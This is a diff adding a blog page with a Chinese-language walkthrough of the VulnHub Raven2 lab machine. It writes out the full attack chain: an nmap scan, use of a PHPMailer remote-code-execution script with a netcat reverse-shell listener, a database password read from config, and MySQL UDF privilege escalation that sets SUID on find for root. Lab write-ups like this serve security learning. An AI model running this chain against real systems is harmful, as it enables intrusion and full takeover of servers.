@@ -1,0 +1,407 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || Penetration-Raven2</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a href="">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a href="">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>Penetration-Raven2 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/6/23
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/vulnhub" style=color:#00a596>
+                    vulnhub
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <p>vulhub的raven2靶机：</p>
+<span id="more"></span>
+
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231706056.png" alt="image-20230623135918904"></p>
+<p>确认靶机地址为192.168.91.133</p>
+<p>扫描一下：<code>nmap -sV -sC 192.168.91.133 --script=vuln</code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707310.png" alt="image-20230623140353745"></p>
+<p>1.发现80端口的网站可能有csrf漏洞</p>
+<p>2.目录枚举发现一些路径</p>
+<p>3.有一些可能存在的漏洞</p>
+<p>4.使用了wordpress搭建博客</p>
+<p>先进网站看一看：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707306.png" alt="image-20230623143033224"></p>
+<p>知道wordpress的版本是4.8.22，popper的版本是1.12.9，apache服务器的版本是2.4.10，使用mysql数据库，网站暂时没有其他有用的东西，有一个登录接口，但是实际链接到主页，也没有用：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231708604.png" alt="image-20230623143221923"></p>
+<p>扫描一下目录：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707925.png" alt="image-20230623143328697"></p>
+<p>1.发现很多可用的路径，先上去看看一些看起来比较特殊的路径</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709066.png" alt="image-20230623143812489"></p>
+<p>1.原本以为会是一个可以上传文件的接口，上去后发现只有一张图片，居然正好是一个flag，xs~：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707542.png" alt="image-20230623143936977"></p>
+<p>&#x3D;&#x3D;&gt;</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707650.png" alt="image-20230623143950145"></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707431.png" alt="image-20230623144450799"></p>
+<p>这两个页面访问不了</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231707340.png" alt="image-20230623144827225"></p>
+<p>1.在这个vendor页面发现了很多东西</p>
+<p>2.在readme里面发现了使用PHPMailer，在后续文档中发现版本号可能是5.2.16</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709461.png" alt="image-20230623145728081"></p>
+<p>在path中发现了webroot路径，还得到了一个flag</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709732.png" alt="image-20230623145318082"></p>
+<p>webroot：&#x2F;var&#x2F;www&#x2F;html</p>
+<p>现在几乎遍历了整个网站，找到了两个flag，接下来大致至少有三个攻击面：一是攻击wordpress4.8.22，另一个是攻击PHPmailer5.2.16，然后是MySQL数据库的udf提权，但是这需要先得到shell。这里先搜寻一下有没有相关漏洞：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709760.png" alt="image-20230623150149932"></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709447.png" alt="image-20230623150227108"></p>
+<p>显然PHPMailer上的RCE漏洞是更好的选择</p>
+<p>这里使用一下这个py脚本，在库中找到40974.py,复制一份到外面的目录中</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709502.png" alt="image-20230623154615369"></p>
+<p>这个脚本应该是上传一个脚本通过socket连接反弹shell,通过访问这个contact.php触发生成后门文件，再访问后门文件触发shell反弹</p>
+<p>1.target是我们脚本的保存位置</p>
+<p>2.连接的主机是本机ip，然后端口是4444</p>
+<p>3.这里需要填入之前找到的webroot</p>
+<p>注意：这里的各个位置都要修改名字或者ip，我也不知道为什么不修改无法成功拿到shell</p>
+<p>运行脚本<code> python 40974.py</code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231709752.png" alt="image-20230623153627953"></p>
+<p>访问这个地址就可以触发shell</p>
+<p><code>nc -lvnp 4444</code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710690.png" alt="image-20230623154738288"></p>
+<p>拿到了shell</p>
+<p>试着提权：</p>
+<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>然后找找flag，因为之前的flag都属flag + N 的形式，所以这里使用正则加一个位置：</p>
+<p><code>find ./ -name &quot;flag*.txt&quot; 2&gt;/dev/null</code></p>
+<p>拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710350.png" alt="image-20230623155307556"></p>
+<p>我们之前的思路，还有wordpress没有探索，以及数据库。</p>
+<p>我们进入wordpress目录，里面的文件之前目录遍历基本上都没有成功访问，读一读配置文件之类的：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710667.png" alt="image-20230623160219544"></p>
+<p>好得不行，root：R@v3nSecurity</p>
+<p>连接数据库：</p>
+<pre><code>www-data@Raven:/var/www/html/wordpress$ mysql -u root -p
+mysql -u root -p
+Enter password: R@v3nSecurity
+</code></pre>
+<p>这里看到版本号为5.5.60</p>
+<pre><code>Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 73
+Server version: 5.5.60-0+deb8u1 (Debian)
+</code></pre>
+<p>UDF提权还没学习到，这里直接参照一下其他师傅的博客复刻一下：</p>
+<p>直接搜索5.5.6没有udf提权漏洞，搜索了一下，发先有以下要求：</p>
+<p>1.如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</p>
+<p>2.如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</p>
+<p>3.所拥有的权限必须有insert和delete的权限</p>
+<p>4.具有目录的写权限<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_36433730/article/details/113208982">https://blog.csdn.net/weixin_36433730/article/details/113208982</a></p>
+<p>由于我们拿到了root账户，那可以try一try：</p>
+<p>这里还看到一位博主的说法：</p>
+<p><code>show global variables like &#39;secure%&#39;;</code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710434.png" alt="image-20230623161826094"></p>
+<p>[(146条消息) VulnHub-Raven-靶机渗透学习_嗯嗯呐的博客-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/shenyu_1126/article/details/109614583?ops_request_misc=%7B%22request_id%22:%22168749990116800185833529%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168749990116800185833529&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-109614583-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=raven">https://blog.csdn.net/shenyu_1126/article/details/109614583?ops_request_misc=%7B%22request%5Fid%22%3A%22168749990116800185833529%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=168749990116800185833529&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-109614583-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=raven</a> tty1&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<p>这里使用的是这个文件，一样的先拷贝出来：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710374.png" alt="image-20230623161946083"></p>
+<pre><code>cp /usr/share/exploitdb/exploits/linux/local/1518.c ./
+gcc -g -c 1518.c
+gcc -g -shared -o  raptor_udf.so 1518.o -lc
+</code></pre>
+<p>这里的意思是（GPT）：</p>
+<pre><code>cp /usr/share/exploitdb/exploits/linux/local/1518.c ./：这个命令将 /usr/share/exploitdb/exploits/linux/local/1518.c 文件复制到当前目录 (./) 中。
+
+gcc -g -c 1518.c：这个命令使用 GCC 编译器编译名为 1518.c 的 C 源文件，并生成一个目标文件 1518.o。选项 -g 表示生成调试信息。
+
+gcc -g -shared -o raptor_udf.so 1518.o -lc：这个命令使用 GCC 编译器将 1518.o 目标文件链接为一个共享库 raptor_udf.so。选项 -g 表示生成调试信息，选项 -shared 表示生成一个共享库，选项 -o 指定输出的文件名。最后的 -lc 是链接 C 标准库。
+</code></pre>
+<p>暂时还不是很理解，先move on</p>
+<p>将文件上传到靶机：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710610.png" alt="image-20230623163103803"></p>
+<p>进入数据库创建数据表 foo，向表中插入二进制数据，然后利用dumpfile函数把文件导出， 再新建存储函数do_system类型是integer，别名（soname）文件名字</p>
+<pre><code>mysql -u root -pR@v3nSecurity
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file(&#39;/var/www/html/raptor_udf.so&#39;));
+select * from foo into dumpfile &#39;/usr/lib/mysql/plugin/raptor_udf.so&#39;;
+create function do_system returns integer soname &#39;raptor_udf.so&#39;;
+select * from foo into dumpfile &#39;/usr/lib/mysql/plugin/raptor_udf.so&#39;;
+create function do_system returns integer soname &#39;raptor_udf.so&#39;;
+</code></pre>
+<p>通过do_system函数给find命令所有者的suid权限，使其可以执行root权限的命令</p>
+<pre><code class="bash">select do_system(&#39;chmod u+s /usr/bin/find&#39;);
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231710641.png" alt="image-20230623164007615"></p>
+<p>此时find命令拥有root权限，通过-exec tag 执行命令，但是不知道为什么能够直接获得root权限而不是反复调用-exec tag。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306231711406.png" alt="image-20230623165637187"></p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
